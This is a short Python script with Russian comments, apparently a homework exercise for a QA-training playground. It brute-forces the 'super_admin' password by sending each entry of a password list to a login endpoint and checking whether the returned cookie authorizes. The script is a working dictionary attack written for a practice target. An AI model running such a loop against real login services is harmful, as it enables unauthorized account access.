import dataset as data
import requests

url = 'https://playground.learnqa.ru/ajax/api/'

methods = {
    'get_cookie': 'get_secret_password_homework',
    'check_cookie': 'check_auth_cookie'
}

# Забираем предварительно собранный список паролей
for try_pass in set(data.passwords):

    # Запрашиваем куки
    get_cookie = requests.post(url + methods['get_cookie'], data={'login': "super_admin", 'password': try_pass})

    # Сохраняем куки
    auth_cookie = get_cookie.cookies

    # Отправляем куки
    check_cookie = requests.post(url + methods['check_cookie'], cookies=auth_cookie)

    # Выводим результат
    print(try_pass)
    print(check_cookie.text, '\n')
    if check_cookie.text != 'You are NOT authorized':
        print(f"Ваш пароль: {try_pass}")
        break
